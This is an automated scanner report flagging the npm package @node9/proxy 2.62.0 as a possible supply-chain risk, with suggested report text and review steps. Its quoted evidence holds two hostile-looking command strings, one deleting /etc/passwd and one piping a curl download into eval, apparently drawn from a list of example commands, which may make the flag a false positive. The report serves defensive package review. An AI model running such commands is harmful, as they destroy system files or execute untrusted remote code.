# Suspicious package report: `@node9/proxy` 2.62.0 (npm)

> Generated automatically by PkgWatch from static analysis. The package was **not** installed or executed. This is a lead for human review, not a verdict: false positives happen.

| | |
|---|---|
| Package | `@node9/proxy` |
| Version | `2.62.0` |
| Ecosystem | npm |
| Risk score | 75 / 100 (high) |
| Published | 2026-11-15T12:15:17Z |
| Scanned | 2026-11-15T17:55:06Z |
| Registry page | https://www.npmjs.com/package/@node9/proxy/v/2.62.0 |

## Indicators

- **exfiltration** (high, +40): Code reads credential, browser, chat-token or wallet files and also makes network calls in the same file.

  Evidence in `package/dist/scan-ink.mjs`:

  ```text
  example: "rm /etc/passwd",
  ```

- **binary-dropper** (medium, +35): Code downloads a file and then executes it or marks it executable.

  Evidence in `package/dist/scan-ink.mjs`:

  ```text
  example: 'eval "$(curl -s https://example.com/install)"',
  ```


## Suggested text for an upstream report

The npm package `@node9/proxy` version `2.62.0` shows indicators consistent with a supply-chain attack. Static analysis (no execution) found:

- Code reads credential, browser, chat-token or wallet files and also makes network calls in the same file.
- Code downloads a file and then executes it or marks it executable.

Please review the package and remove it if it violates registry policy.

## Before forwarding

1. Open the registry page and read the flagged files yourself.
2. Confirm the behaviour is not a legitimate feature of the package.
3. If it holds up, report it via https://www.npmjs.com/support (choose "Report malware"), or the "Report malware" link on the package page.
4. If it does not, record it here: https://github.com/abidranesh/typosquat_-_mal_package_tracker/issues/new?template=false-positive.yml&labels=false-positive&title=False%20positive%3A%20npm%2F%40node9%2Fproxy%402.62.0&package=npm%2F%40node9%2Fproxy%402.62.0
